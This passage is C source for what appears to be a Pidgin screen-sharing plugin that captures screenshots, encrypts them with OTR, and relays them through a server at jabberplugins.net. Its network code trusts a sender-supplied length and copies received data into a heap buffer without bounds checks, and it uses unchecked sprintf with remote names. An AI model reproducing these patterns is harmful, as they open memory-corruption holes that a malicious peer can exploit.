               wm_type = !can_kde_screen_capture ? WM_UNK : WM_KDE;
               if (wm_type == WM_UNK) gtk_messagebox("Your WM is KDE, but spectacle is not detected. Screen-capture will not work this way. Please 'sudo apt install spectacle', restart & try again!");
               break;
            } else
            if (g_strcmp0(name, "org.xfce.SessionManager") == 0)
            {
               g_variant_iter_free(iter);
               g_variant_unref(result);
               g_object_unref(connection);
               wm_type = !can_xfce_screen_capture ? WM_UNK : WM_XFCE;
               if (wm_type == WM_UNK) gtk_messagebox("Your WM is XFCE, but xfce4-screenshooter is not detected. Screen-capture will not work this way. Please 'sudo apt install xfce4-screenshooter', restart & try again!");
               break;
            }
         }
         g_variant_iter_free(iter);
         g_variant_unref(result);
      }
      g_object_unref(connection);
   }

   if (wm_type == WM_UNK && error)
      g_clear_error(&error);

   return wm_type;
}

int execute_system_command(const char *command)
{
   int return_code = system(command);
   if (return_code == -1) return -1;
   else
   if (WIFEXITED(return_code))
   {
      int exit_status = WEXITSTATUS(return_code);
      if (exit_status == 0) return 0;
      else return -1;
   }
   return -1;
}

// todo: eventually update this section to use native KDE, XFCE, WAYLAND, X11 functions
//       ... only thing is its kind of annoying because different versions have their own DBUS interfaces
GdkPixbuf* snap_screenshot(_wm_type wm)
{
   GdkPixbuf *screenshot = 0;
   if (wm == WM_UNK) return screenshot;

   char filename[520], command[520];
   memset(filename, 0, 520);
   memset(command, 0, 520);
   
   struct stat st = {0};
   if (stat("/tmp/store", &st) == -1) mkdir("/tmp/store", 0700);

   snprintf(filename, sizeof(filename), "%s/tmp/store/%d.png", getenv("HOME"), g_random_int());
   
   int ret_val = -1;
   switch (wm)
   {
      case WM_GNOME:
      {
         if (can_gnome_screen_capture)
         {
            snprintf(command, sizeof(command), "gnome-screenshot -f %s", filename);
            ret_val = execute_system_command(command);
         }
      } break;
      case WM_XFCE:
      {
         if (can_xfce_screen_capture)
         {
            snprintf(command, sizeof(command), "xfce4-screenshooter -f -s %s", filename);
            ret_val = execute_system_command(command);
         }
      } break;
      case WM_KDE:
      {
         if (can_kde_screen_capture)
         {
            snprintf(command, sizeof(command), "spectacle -f -b -o %s", filename);
            ret_val = execute_system_command(command);
         }
      } break;
   }

   if (ret_val == 0)
   {
      GError *error = 0;
      screenshot = gdk_pixbuf_new_from_file(filename, &error);
      if (error) g_clear_error(&error);
      g_unlink(filename);
   }

   return screenshot;
}

void capture_window(Display* _display, Window xwindow, int* target_width, int* target_height, unsigned char** bitmap_data, unsigned long* bitmap_size, GdkRectangle* rectangle)
{
   XWindowAttributes attrs;
   XGetWindowAttributes(_display, xwindow, &attrs);

   *target_width  = attrs.width;
   *target_height = attrs.height;

   if (*target_width && *target_height)
   {
      if (xwindow == DefaultRootWindow(GDK_DISPLAY_XDISPLAY(gdk_display_get_default())))
      {
         GdkPixbuf* screenshot = snap_screenshot(wm_type);
         if (screenshot)
         {
            save_pixbuf_to_memory(screenshot, bitmap_data, bitmap_size);
            g_object_unref(screenshot);
         }
      }
      else
      {
         cairo_surface_t *surface = cairo_xlib_surface_create(_display, xwindow, DefaultVisual(_display, DefaultScreen(_display)), *target_width, *target_height);
         if (surface)
         {
            buffer_t buf = {0, 0, 0};
            cairo_status_t status = cairo_surface_write_to_png_stream(surface, write_png_to_buffer, &buf);
            if (status == CAIRO_STATUS_SUCCESS)
            {
               *bitmap_data = buf.data;
               *bitmap_size = (unsigned long) buf.size;
            }
            cairo_surface_destroy(surface);
         }
      }
   }
}
#endif

gboolean has_share_started = FALSE;
static void on_tree_view_row_activated(GtkTreeView *tree_view, gpointer user_data)
{
	GtkTreeSelection *selection = gtk_tree_view_get_selection(tree_view);
	if (selection)
	{
		GtkTreeIter iter;
    	GtkTreeModel* model;
		if (gtk_tree_selection_get_selected(selection, &model, &iter))
		{
			gint list_id;
			gtk_tree_model_get(model, &iter, 0, &list_id, -1);
			gtk_widget_set_sensitive(GTK_WIDGET(user_data), has_share_started || selected_window != NULL);
        	if (list_id) selected_window = window_list[list_id-1].hwnd;
			else
         {
            #ifdef _WIN32
            selected_window = GetDesktopWindow();
            #else
            selected_window = DefaultRootWindow(GDK_DISPLAY_XDISPLAY(gdk_display_get_default()));
            #endif
         }
         has_share_started = TRUE;
		}
	}
}

uint32_t sotr_unique_id = 0; // djb2_hash(sender_user;receiver_user)
static gboolean capture_enabled = FALSE;
static double bytes_sent = 0;
static double bytes_received = 0;
int target_width = 0, target_height = 0;
int should_viewer_watch = 0; // when the sender starts recording = TRUE ---- when the sender stops recording = FALSE
int is_screensharer = 0; // screensharer (sender) = TRUE ---- viewer (receiver) = FALSE
int is_otr_enabled = 0;
int is_otr_loaded = 0;

typedef struct {
	PurpleConversation* conv;
	GtkWidget* button;
   GtkWidget* tree_view;
} DialogParams;

uint32_t generate_uid(const char *str)
{
   uint32_t hash = 5381;
   int c = 0;

   while ((c = *str++)) hash = ((hash << 5) + hash) + c;
   return hash;
}

typedef struct {
   GtkWidget *set_size;
   GtkWidget *container;
   GtkWidget *width_spin;
   GtkWidget *height_spin;
   GtkWidget* parent_window;
	PurpleConversation* conv;
} SizeData;

int client_width = 800;
int client_height = 600;
char bytes_out[64] = {0};
#ifdef _WIN32
void *screensharer_thread = 0;
void *paint_screen_thread = 0;
#else
thrd_t screensharer_thread;
thrd_t paint_screen_thread;
#endif
#define ONE_MEGABYTE (1024*1024)
OtrlUserState otr_userstate = 0;
double data_sent = 0, data_recv = 0;
GtkWidget *stop_button = 0, *drawing_area = 0;
GtkWidget *label_data_sent = 0, *label_data_received = 0;
GtkWidget *screenshare_container = 0, *screenshare_window = 0;

bool ok(gcry_error_t et)
{
   return gcry_err_code(et) == GPG_ERR_NO_ERROR;
}

int setup_keys(const char* privkey, const char* instag, const char* accountname, const char* protocol)
{
   gcry_error_t et = otrl_privkey_read_func(otr_userstate, privkey);
   if (!ok(et)) if (!ok(otrl_privkey_generate_func(otr_userstate, privkey, accountname, protocol))) return 0;

   et = otrl_instag_read_func(otr_userstate, instag);
   if (!ok(et)) if (!ok(otrl_instag_generate_func(otr_userstate, instag, accountname, protocol))) return 0;

   return 1;
}

static void send_user_message(PurpleConversation *conv, const char* message)
{
   if (!conv || !message) return;
   const char *sender = purple_conversation_get_account(conv) ? purple_account_get_username(purple_conversation_get_account(conv)) : "Unknown";
   char *formatted_message = g_strdup_printf(message, sender);
   if (formatted_message)
   {
      purple_conv_im_send_with_flags(PURPLE_CONV_IM(conv), formatted_message, PURPLE_MESSAGE_SEND);
      g_free(formatted_message);
   }
}

int prev_client_width = 800, prev_client_height = 600;
static void set_size_button_clicked(GtkWidget *widget, gpointer data)
{
   SizeData *size_data = (SizeData *) data;
   if (!size_data) return;
   if (!size_data->conv || !size_data->container || !size_data->parent_window || !size_data->width_spin || !size_data->height_spin) return;

   client_width = (int) gtk_spin_button_get_value_as_int(GTK_SPIN_BUTTON(size_data->width_spin));
   client_height = (int) gtk_spin_button_get_value_as_int(GTK_SPIN_BUTTON(size_data->height_spin));
   
   gtk_widget_set_size_request(size_data->container, client_width, client_height);
   #ifndef _WIN32
   gtk_widget_set_size_request(drawing_area, client_width, client_height);
   #endif
   // NOTE: Parent window resizes automatically if its client_width/height should be bigger, but it wont down-size (shrink) if the client_width/height is smaller
   if (prev_client_height < client_height || prev_client_width < client_width)
   {
      #ifdef _WIN32
      Sleep(100);
      #else
      sleep_ms(100);
      #endif
      gtk_window_resize(GTK_WINDOW(size_data->parent_window), client_width, client_height + 100);
   }

   char dimensions_packet[64] = {0};
   sprintf(dimensions_packet, "?SSOTRv11? #:%dx%d;", (int) client_width, (int) client_height);
   send_user_message(size_data->conv, dimensions_packet);

   prev_client_width = client_width;
   prev_client_height = client_height;
}

void input_changed(GtkWidget *widget, gpointer data)
{
   SizeData *size_data = (SizeData *) data;
   if (!size_data) return;
   if (!size_data->width_spin || !size_data->height_spin || !size_data->set_size) return;

   gint width_value = gtk_spin_button_get_value_as_int(GTK_SPIN_BUTTON(size_data->width_spin));
   gint height_value = gtk_spin_button_get_value_as_int(GTK_SPIN_BUTTON(size_data->height_spin));

   GdkScreen *screen = gdk_screen_get_default();
   gint max_width    = gdk_screen_get_width(screen);
   gint max_height   = gdk_screen_get_height(screen);

   if (width_value > max_width) gtk_spin_button_set_value(GTK_SPIN_BUTTON(size_data->width_spin), max_width);
   if (height_value > max_height) gtk_spin_button_set_value(GTK_SPIN_BUTTON(size_data->height_spin), max_height);
}

void on_window_destroy(GtkWidget *widget, gpointer data)
{
   send_user_message((PurpleConversation*) data, "?SSOTRv11? $:$;");
   if (paint_screen_thread != NULL)
   {
      should_viewer_watch = 0;
      // NOTE: enough time for the socket to close
      #ifdef _WIN32
      Sleep(1000);
      #else
      sleep_ms(1000);
      #endif
      client_width = 800;
      client_height = 600;
      #ifdef _WIN32
      TerminateThread(paint_screen_thread, 0);
      CloseHandle(paint_screen_thread);
      #endif
      screenshare_container = 0;
      paint_screen_thread = 0;
   }
   else
   if (screensharer_thread != NULL)
   {
      capture_enabled = FALSE;
      #ifdef _WIN32
      Sleep(1000);
      #else
      sleep_ms(1000);
      #endif
      target_width = 0;
      target_height = 0;
      selected_window = 0;
      #ifdef _WIN32
      TerminateThread(screensharer_thread, 0);
      CloseHandle(screensharer_thread);
      #endif
      screensharer_thread = 0;
   }
   curr_screenshare_conv = 0;
   sotr_unique_id = 0;
   data_recv = 0;
   data_sent = 0;
}

static void update_ui_data()
{
   memset(bytes_out, 0, 64);
   sprintf(bytes_out,
   is_screensharer ? 
      "Data Sent: %.3f MB" :
      "Data Received: %.3f MB",
   is_screensharer ?
      (double) data_sent :
      (double) data_recv);
   if (is_screensharer)
      gtk_label_set_text(GTK_LABEL(label_data_sent), bytes_out);
   else
      gtk_label_set_text(GTK_LABEL(label_data_received), bytes_out);
}

static gboolean update_data_callback(gpointer data)
{
   if (capture_enabled || should_viewer_watch)
   {
      update_ui_data();
      return TRUE;
   }
   else return FALSE;
}

GtkWidget* show_screenshare_recv_dialog(PurpleConversation* conv, char* real_who)
{
   GtkWidget *main_container, *top_container, *bottom_container;
   GtkWidget *width_section, *height_section, *set_size_section;
   GtkWidget *width_label, *width_input, *height_label, *height_input;

   screenshare_window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
   #ifndef _WIN32
   gtk_window_set_default_size(GTK_WINDOW(screenshare_window), 1024, 768);
   #endif;

   char window_title[260] = {0};
   sprintf(window_title, "Pidgin - Currently viewing %s's screen", real_who);
   gtk_window_set_title(GTK_WINDOW(screenshare_window), window_title);

   main_container = gtk_fixed_new();
   gtk_container_set_border_width(GTK_CONTAINER(main_container), 10);
   gtk_container_add(GTK_CONTAINER(screenshare_window), main_container);

   top_container = gtk_fixed_new();
   gtk_widget_set_size_request(top_container, 800, 50);
   gtk_fixed_put(GTK_FIXED(main_container), top_container, 0, 0);

   bottom_container = gtk_fixed_new();
   gtk_widget_set_size_request(bottom_container, 800, 600);
   gtk_fixed_put(GTK_FIXED(main_container), bottom_container, 0, 70);

   width_section = gtk_hbox_new(FALSE, 5);
   height_section = gtk_hbox_new(FALSE, 5);
   set_size_section = gtk_hbox_new(FALSE, 5);

   GdkScreen *screen = gdk_screen_get_default();
   gint max_width = gdk_screen_get_width(screen);
   gint max_height = gdk_screen_get_height(screen);

   width_label = gtk_label_new("Width x Height:");
   width_input = gtk_spin_button_new_with_range(0, max_width, 1);
   gtk_spin_button_set_value(GTK_SPIN_BUTTON(width_input), 800);
   gtk_widget_set_name(width_input, "width");

   height_input = gtk_spin_button_new_with_range(0, max_height, 1);
   gtk_spin_button_set_value(GTK_SPIN_BUTTON(height_input), 600);
   gtk_widget_set_name(height_input, "height");

   GtkWidget *set_size_button = gtk_button_new_with_label("Set Size");
   gtk_widget_set_name(set_size_button, "set-size");   

   label_data_received = gtk_label_new("Data Received: 0.0 MB");

   gtk_box_pack_start(GTK_BOX(width_section), width_label, FALSE, FALSE, 0);
   gtk_box_pack_start(GTK_BOX(width_section), width_input, FALSE, FALSE, 0);
   gtk_box_pack_start(GTK_BOX(width_section), gtk_label_new("x"), FALSE, FALSE, 0);
   gtk_box_pack_start(GTK_BOX(height_section), height_input, FALSE, FALSE, 0);
   gtk_box_pack_start(GTK_BOX(set_size_section), set_size_button, FALSE, FALSE, 0);

   SizeData *size_data = g_new(SizeData, 1);
   size_data->container = bottom_container;
   size_data->width_spin = width_input;
   size_data->height_spin = height_input;
   size_data->conv = conv;
   size_data->set_size = set_size_button;
   size_data->parent_window = screenshare_window;

   g_signal_connect(G_OBJECT(set_size_button), "clicked", G_CALLBACK(set_size_button_clicked), size_data);
   g_signal_connect(screenshare_window, "destroy", G_CALLBACK(on_window_destroy), conv);
   g_signal_connect(G_OBJECT(width_input), "changed", G_CALLBACK(input_changed), size_data);
   g_signal_connect(G_OBJECT(height_input), "changed", G_CALLBACK(input_changed), size_data);

   gtk_fixed_put(GTK_FIXED(top_container), width_section, 0, 0);
   gtk_fixed_put(GTK_FIXED(top_container), height_section, 155, 0);
   gtk_fixed_put(GTK_FIXED(top_container), set_size_section, 210, 0);
   gtk_fixed_put(GTK_FIXED(top_container), label_data_received, 265, 0);

   g_timeout_add_seconds(1, update_data_callback, NULL);

   gtk_widget_show_all(screenshare_window);

   return bottom_container;
}

int tunnel_packet_data(
   #ifdef _WIN32
   SOCKET
   #else
   int
   #endif
   * sockfd, char* data, int len)
{
	int bytes_sent = http_send_data(*sockfd, data, len);
	if (bytes_sent == SOCKET_ERROR)
	{
		int error = 
      #ifdef _WIN32
      WSAGetLastError();
      #else
      errno;
      #endif
		switch (error)
		{
         #ifdef _WIN32
         case WSAECONNRESET:
         case WSAENOTCONN:
         case WSAECONNABORTED:
         case WSAENOTSOCK:
         #else
         case ECONNRESET:
         case ENOTCONN:
         case ECONNABORTED:
         case ENOTSOCK:
         case EBADF:
         #endif
         {
            int optval = 0, should_reconnect = 0;
            socklen_t optlen = sizeof(optval);

            if (getsockopt(*sockfd, SOL_SOCKET, SO_ERROR, (char*)&optval, &optlen) == SOCKET_ERROR) should_reconnect = 1;
            if (optval != 0) should_reconnect = 1;
            if (should_reconnect || *sockfd == INVALID_SOCKET)
            {
               if (*sockfd != INVALID_SOCKET) closesocket(*sockfd);

               struct addrinfo hints, *res = NULL, *p;
               memset(&hints, 0, sizeof hints);
               hints.ai_family = AF_UNSPEC;
               hints.ai_socktype = SOCK_STREAM;
               if (getaddrinfo("jabberplugins.net", "1337", &hints, &res) == 0)
               {
                  for (p = res; p; p = p->ai_next)
                  {
                     *sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
                     if (*sockfd == -1) continue;

                     if (connect(*sockfd, p->ai_addr, p->ai_addrlen) == -1)
                     {
                        closesocket(*sockfd);
                        *sockfd = INVALID_SOCKET;
                        continue;
                     }
                     else break;
                  }
                  freeaddrinfo(res);
               }
            }
            bytes_sent = http_send_data(*sockfd, data, len);
         }
         break;
		}
	}
	return bytes_sent;
}

#ifdef _WIN32
int set_socket_nonblocking(SOCKET socket)
{
   u_long mode = 1;
   if (ioctlsocket(socket, FIONBIO, &mode) != NO_ERROR)
      return 0;

   return 1;
}
#else
int set_socket_nonblocking(int socket)
{
   int flags = fcntl(socket, F_GETFL, 0);
   if (flags == -1) return 0;

   flags |= O_NONBLOCK;
   if (fcntl(socket, F_SETFL, flags) == -1) return 0;
   
   return 1;
}
#endif

static int recv_with_timeout(
   #ifdef _WIN32
   SOCKET
   #else
   int
   #endif
   socket, char** data, int timeout_ms)
{
   if (set_socket_nonblocking(socket) == 0) {
      return -1;
   }

	fd_set readSet = { 0 };
	FD_ZERO(&readSet);
	FD_SET(socket, &readSet);
	struct timeval timeout = { 0 };
	timeout.tv_sec = timeout_ms / 1000;
	timeout.tv_usec = (timeout_ms % 1000) * 1000;
	int selectResult = select(
   #ifdef _WIN32
      0
   #else
      socket + 1
   #endif
   , &readSet, 0, 0, &timeout);
	if (selectResult <= 0) return -1;

	int max_bytes_to_read = 0;
	int max_bytes_offset = 0;
	int max_retries = 10;
	int retries = 0;

   char buffer[1024] = { 0 };
	int curr_buffer_size = 0, bytes_read_now = 
   #ifdef _WIN32
   recv(socket, buffer, 1024 - 1, 0);
   #else
   read(socket, buffer, 1024 - 1);
   #endif
	if (bytes_read_now > 0)
	{
		*(buffer + bytes_read_now) = '\0';
		char* delimiterPos = strchr(buffer, ':');
		if (delimiterPos)
		{
			max_bytes_offset = delimiterPos - buffer;
			if (max_bytes_offset <= 7)
			{
				if (max_bytes_offset > 5) max_retries = 30;
				if (max_bytes_offset > 6) max_retries = 60;

				char max_bytes_string[8] = { 0 };
				strncpy(max_bytes_string, buffer, max_bytes_offset);
				
				max_bytes_to_read = atoi(max_bytes_string);
				bytes_read_now -= (max_bytes_offset + 1);

				if (!(*data))
				{
					*data = (char*)malloc(max_bytes_to_read + 1);
					if (!(*data)) return -1;
					else
					{
						memcpy(*data, buffer + max_bytes_offset + 1, bytes_read_now);
						*(*data + bytes_read_now) = '\0';
					}
				}
			}
		}
		curr_buffer_size = bytes_read_now;
		if (max_bytes_to_read && *data)
		{
			while (curr_buffer_size < max_bytes_to_read)
			{
				bytes_read_now = 
            #ifdef _WIN32
            recv(socket, (char*) *data + curr_buffer_size, max_bytes_to_read - curr_buffer_size, 0);
            #else
            read(socket, (char*) *data + curr_buffer_size, max_bytes_to_read - curr_buffer_size);
            #endif
				if (bytes_read_now > 0) *(*data + curr_buffer_size + bytes_read_now) = '\0';

				if (bytes_read_now > 0 && (curr_buffer_size + bytes_read_now) <= max_bytes_to_read)
					curr_buffer_size += bytes_read_now;
				else
				if (bytes_read_now == -1)
				{
					if (retries > max_retries) break;
					else
               #ifdef _WIN32
					if (WSAGetLastError() == WSAEWOULDBLOCK)
               #else
               if (errno == EAGAIN || errno == EWOULDBLOCK)
               #endif
					{
                  #ifdef _WIN32
						Sleep(100);
                  #else
                  sleep_ms(100);
                  #endif
						++retries;
					}
					else break;
				}
			}
		}
	}
	return curr_buffer_size == max_bytes_to_read ? curr_buffer_size : -1;
}

GdkPixbuf* create_pixbuf_from_data(const unsigned char* data, int size, int width, int height)
{
    GdkPixbuf *pixbuf = NULL;
    GError *error = NULL;

    GdkPixbufLoader *loader = gdk_pixbuf_loader_new();
    gdk_pixbuf_loader_write(loader, data, size, &error);
    gdk_pixbuf_loader_close(loader, &error);
    if (!error)
    {
        pixbuf = gdk_pixbuf_loader_get_pixbuf(loader);
        if (pixbuf)
        {
            if (gdk_pixbuf_get_width(pixbuf) != width || gdk_pixbuf_get_height(pixbuf) != height)
            {
                GdkPixbuf *scaled_pixbuf = gdk_pixbuf_scale_simple(pixbuf, width, height, GDK_INTERP_BILINEAR);
                g_object_unref(pixbuf);
                pixbuf = scaled_pixbuf;
            }
        }
    }
    else g_error_free(error);
    return pixbuf;
}

size_t decompress_png(const void* input_buffer, size_t input_size, unsigned char** output_buffer)
{
   struct libdeflate_decompressor *decompressor = libdeflate_alloc_decompressor_func();
   if (!decompressor) return 0;

   char* delimiter_pos = memchr(input_buffer, ':', 8);
   if (!delimiter_pos) return 0;

   int length = (delimiter_pos - (char*) input_buffer);
   if (length > 7 || length <= 0) return 0;

   char max_bytes_string[8] = { 0 };
   memcpy(max_bytes_string, input_buffer, length);
   max_bytes_string[length] = '\0';

   size_t max_decompressed_size = (size_t) atoi(max_bytes_string);
   *output_buffer = malloc(max_decompressed_size);
   if (!*output_buffer)
   {
      libdeflate_free_decompressor_func(decompressor);
      return 0;
   }

   size_t decompressed_size = 0;
   enum libdeflate_result result = libdeflate_deflate_decompress_func(decompressor, 
      input_buffer + (length + 1), 
      input_size - (length + 1),
      *output_buffer, max_decompressed_size, &decompressed_size);
   libdeflate_free_decompressor_func(decompressor);
   if (result != LIBDEFLATE_SUCCESS || !decompressed_size)
   {
      free(*output_buffer);
      return 0;
   }

   return decompressed_size;
}

size_t compress_png(const unsigned char* input_buffer, size_t input_size, unsigned char** output_buffer)
{
   struct libdeflate_compressor *compressor = libdeflate_alloc_compressor_func(12);

   if (!compressor) return 0;

   size_t max_compressed_size = libdeflate_deflate_compress_bound_func(compressor, input_size);

   *output_buffer = malloc(max_compressed_size);
   if (!*output_buffer)
   {
      libdeflate_free_compressor_func(compressor);
      return 0;
   }

   size_t compressed_size = libdeflate_deflate_compress_func(compressor,
                                 input_buffer, input_size,
                                 *output_buffer, max_compressed_size);
   libdeflate_free_compressor_func(compressor);

   if (compressed_size == 0)
   {
      free(*output_buffer);
      return 0;
   }

   return compressed_size;
}

char sender_username[256] = {0}, receiver_username[256] = {0};
OtrlMessageAppOps ui_ops;

static void libotr_new_fingerprint(void* opdata, OtrlUserState us, const char* accountname, const char* protocol, const char* username, unsigned char fingerprint[20])
{
   char otr_fingerprint[45];
   otrl_privkey_fingerprint_func(us, otr_fingerprint, accountname, protocol);
}
static OtrlPolicy libotr_policy(void* opdata, ConnContext* context){ return OTRL_POLICY_ALLOW_V3 | OTRL_POLICY_REQUIRE_ENCRYPTION; }
static void libotr_create_privkey(void* opdata, const char* accountname, const char* protocol){}
static int libotr_is_logged_in(void* opdata, const char* accountname, const char* protocol, const char* recipient){ return -1; }
static void libotr_inject_message(void* opdata, const char* accountname, const char* protocol, const char* recipient, const char* message)
{
   if (opdata && message)
   {
      int message_length = strlen(message) + 1;
      char* auth_buf = (char*) malloc(message_length + 13 + 1);
      if (auth_buf)
      {
         snprintf(auth_buf, message_length + 13, "?SSOTR_AUTH? %s", message);
         *(auth_buf + message_length + 13) = '\0';
         send_user_message((PurpleConversation*) opdata, auth_buf);
         free(auth_buf);
      }
   }
}
static void libotr_write_fingerprints(void* opdata){}
static void libotr_update_context_list(void* opdata){}
static void libotr_gone_secure(void* opdata, ConnContext* context){ is_otr_secured = 1; }
static void libotr_gone_insecure(void* opdata, ConnContext* context){}
static void libotr_still_secure(void* opdata, ConnContext* context, int is_reply){}
static const char* libotr_error_message(void* opdata, ConnContext* context, OtrlErrorCode err_code){  return 0; }
static void libotr_error_message_free(void* opdata, const char* err_msg){ if (err_msg) free((void*)err_msg); }
static void libotr_log_message(void* opdata, const char* message){}
static int libotr_max_message_size(void* opdata, ConnContext* context){ return 65536; }
static const char* libotr_account_name(void* opdata, const char* account, const char* protocol){ return g_strdup(account); }
static void libotr_account_name_free(void* opdata, const char* account_name){ if (account_name) free((void*)account_name); }
static void libotr_add_appdata(void* data, ConnContext* context){}
static void libotr_received_symkey(void* opdata, ConnContext* context, unsigned int use, const unsigned char* usedata, size_t usedatalen, const unsigned char* symkey){}
static const char* libotr_resent_msg_prefix(void* opdata, ConnContext* context){ return 0; }
static void libotr_resent_msg_prefix_free(void* opdata, const char* prefix){ if (prefix) free((void*)prefix); }
static void libotr_handle_smp_event(void* opdata, OtrlSMPEvent smp_event, ConnContext* context, unsigned short progress_percent, char* question){}
static void libotr_handle_msg_event(void* opdata, OtrlMessageEvent msg_event, ConnContext* context, const char* message, gcry_error_t err){}
static void libotr_convert_msg(void* opdata, ConnContext* context, OtrlConvertType convert_type, char** dest, const char* src){}
static void libotr_convert_free(void* opdata, ConnContext* context, char* dest){ if (dest) free((void*)dest); }
static void libotr_create_instag(void* opdata, const char* accountname, const char* protocol){}

struct s_OtrlMessageAppOps ui_ops =
{
    libotr_policy,
    libotr_create_privkey,
    libotr_is_logged_in,
    libotr_inject_message,
    libotr_update_context_list,
    libotr_new_fingerprint,
    libotr_write_fingerprints,
    libotr_gone_secure,
    libotr_gone_insecure,
    libotr_still_secure,
    libotr_max_message_size,
    libotr_account_name,
    libotr_account_name_free,
    libotr_received_symkey,
    libotr_error_message,
    libotr_error_message_free,
    libotr_resent_msg_prefix,
    libotr_resent_msg_prefix_free,
    libotr_handle_smp_event,
    libotr_handle_msg_event,
    libotr_create_instag,
    libotr_convert_msg,
    libotr_convert_free
};

#ifndef _WIN32
typedef struct
{
   GtkWidget *drawing_area;
   guchar *png_data;
   gsize png_size;
   double scale_x;
   double scale_y;
}
DrawData;

typedef struct
{
   guchar *data;
   gsize size;
   gsize offset;
}
PngDataReader;

cairo_status_t cairo_read_png_stream_callback(void *closure, unsigned char *data, unsigned int length)
{
   PngDataReader *reader = (PngDataReader *) closure;

   if (reader->offset + length > reader->size)
      return CAIRO_STATUS_READ_ERROR;
    
   memcpy(data, reader->data + reader->offset, length);
   reader->offset += length;

   return CAIRO_STATUS_SUCCESS;
}

gboolean expose_event_callback(GtkWidget *widget, GdkEventExpose *event, gpointer user_data)
{
   DrawData *data = (DrawData *)user_data;
   cairo_t *cr = gdk_cairo_create(widget->window);
   if (data->png_data)
   {
      PngDataReader reader = { data->png_data, data->png_size, 0 };
      cairo_surface_t *image_surface = cairo_image_surface_create_from_png_stream(
         cairo_read_png_stream_callback, &reader);

      if (cairo_surface_status(image_surface) == CAIRO_STATUS_SUCCESS)
      {
         cairo_scale(cr, data->scale_x, data->scale_y);
         cairo_set_source_surface(cr, image_surface, 0, 0);
         cairo_paint(cr);
      }
      cairo_surface_destroy(image_surface);
   }

   cairo_destroy(cr);
   return FALSE;
}
#endif

int paint_screenshare_data(void* data)
{
   GtkWidget* container = (GtkWidget*) data;
   if (!container) return 0;

   #ifndef _WIN32
   DrawData *draw_data = 0;
   int is_draw_init = 0, gtk_draw_cb_id = 0;
   #endif
   if (is_otr_enabled) while (!is_otr_secured) 
      #ifdef _WIN32
      Sleep(333);
      #else
      sleep_ms(333);
      #endif

   GtkWidget* image = 0;
   #ifdef _WIN32
   SOCKET
   #else
   int
   #endif
   sockfd = SOCKET_ERROR;
   char lookup_screendata_packet[64];
   for (;should_viewer_watch;)
   {
      memset(lookup_screendata_packet, 0, 64);
      int lookup_screendata_size = sprintf(lookup_screendata_packet, "%lu_RECVER:;end_of_png", sotr_unique_id);
      if (http_send_data(sockfd, lookup_screendata_packet, lookup_screendata_size) == SOCKET_ERROR)
         tunnel_packet_data(&sockfd, lookup_screendata_packet, lookup_screendata_size);

      char* png_data = 0;
      int png_data_size = recv_with_timeout(sockfd, &png_data, 333);
      if (png_data)
      {
         if (png_data_size > 0)
         {  
            data_recv += (double) ((double) png_data_size / ((double) ONE_MEGABYTE));

            int b64_encoding_size = 0;
            char* b64_encoding_data = 0;
         
            if (is_otr_enabled)
            {
               int offset = 0, next_ssotr_offset = 0;
               // NOTE: max message size in libotr
               const int max_chunk_size = 65536;
               char bytes_to_decrypt[max_chunk_size+1], *decrypt_container = 0;
               const char* account_type = purple_account_get_protocol_name(curr_screenshare_conv->account);
               while (offset < png_data_size)
               {
                  if (png_data_size <= max_chunk_size)
                  {
                     memset(bytes_to_decrypt, 0, max_chunk_size+1);

                     const int current_diff = png_data_size - offset,
                        current_chunk_size = current_diff > max_chunk_size ? max_chunk_size : current_diff;

                     memcpy(bytes_to_decrypt, png_data + offset, current_chunk_size);

                     decrypt_container = bytes_to_decrypt;
                     offset += current_chunk_size;
                  }
                  else
                  {
                     const char* next_ssotr_pos = strstr(png_data + offset + 7, "?SSOTR:");
                     if (next_ssotr_pos == 0) next_ssotr_offset = png_data_size - offset;
                     else next_ssotr_offset = next_ssotr_pos - (png_data + offset);

                     decrypt_container = (char*)malloc(next_ssotr_offset + 1);
                     if (decrypt_container)
                     {
                        memcpy(decrypt_container, png_data + offset, next_ssotr_offset);
                        *(decrypt_container + next_ssotr_offset) = '\0';
                        offset += next_ssotr_offset;
                     }
                  }

                  OtrlTLV* tlvs = 0;
                  char* decrypted_bytes = 0;
                  int ret = otrl_message_receiving_func(
                     otr_userstate,
                     &ui_ops, 0,
                     receiver_username,
                     account_type,
                     sender_username,
                     decrypt_container,
                     &decrypted_bytes,
                     &tlvs, 0, 0, 0);
                  if (png_data_size > max_chunk_size)
                     free(decrypt_container);

                  if (!ret)
                  {
                     int decrypted_bytes_size = strlen(decrypted_bytes);
                     if (!b64_encoding_data)
                        b64_encoding_data = (char*) malloc(decrypted_bytes_size + 1);
                     else
                        b64_encoding_data = (char*) realloc(b64_encoding_data, b64_encoding_size + decrypted_bytes_size + 1);

                     memcpy(b64_encoding_data + b64_encoding_size, decrypted_bytes, decrypted_bytes_size);
                     *(b64_encoding_data + b64_encoding_size + decrypted_bytes_size) = '\0';

                     b64_encoding_size += decrypted_bytes_size;
                  }
                  else break;
               }
            }
            else
            {
               b64_encoding_data = png_data;
               b64_encoding_size = png_data_size;
            }

            if (b64_encoding_data && b64_encoding_size)
            {
               size_t real_png_size = 0;
               unsigned char* real_png_data = b64_decode(b64_encoding_data, &real_png_size);
               if (real_png_data && real_png_size)
               {
                  unsigned char* decompressed_png_data = 0;
                  size_t decompressed_png_size = decompress_png(real_png_data, real_png_size, &decompressed_png_data);
                  if (decompressed_png_data && decompressed_png_size)
                  {
                     int width = 0, height = 0, channels = 0;
                     stbi_info_from_memory(decompressed_png_data, decompressed_png_size, &width, &height, &channels);
                     if (width && height && channels)
                     {
                        #ifdef _WIN32
                        // NOTE: this method doesnt work properly in Linux for whatever reason it just causes SEGFAULTs || Freezes
                        GdkPixbuf *pixbuf = create_pixbuf_from_data(decompressed_png_data, decompressed_png_size, client_width, client_height);
                        if (pixbuf)
                        {
                           if (!image)
                           {
                              image = gtk_image_new_from_pixbuf(pixbuf);
                              if (image)
                              {
                                 gtk_fixed_put(GTK_FIXED(container), image, 0, 0);
                                 gtk_widget_show_all(container);
                              }
                           }
                           else gtk_image_set_from_pixbuf(GTK_IMAGE(image), pixbuf);
                           g_object_unref(pixbuf);
                        }
                        free(decompressed_png_data);
                        #else
                        // NOTE: for linux, we will use Cairo with a widget redraw callback
                        if (!is_draw_init)
                        {
                           drawing_area = gtk_drawing_area_new();
                           if (drawing_area)
                           {
                              gtk_widget_set_size_request(drawing_area, 800, 600);
                              gtk_fixed_put(GTK_FIXED(container), drawing_area, 0, 0);
                              gtk_widget_show_all(container);

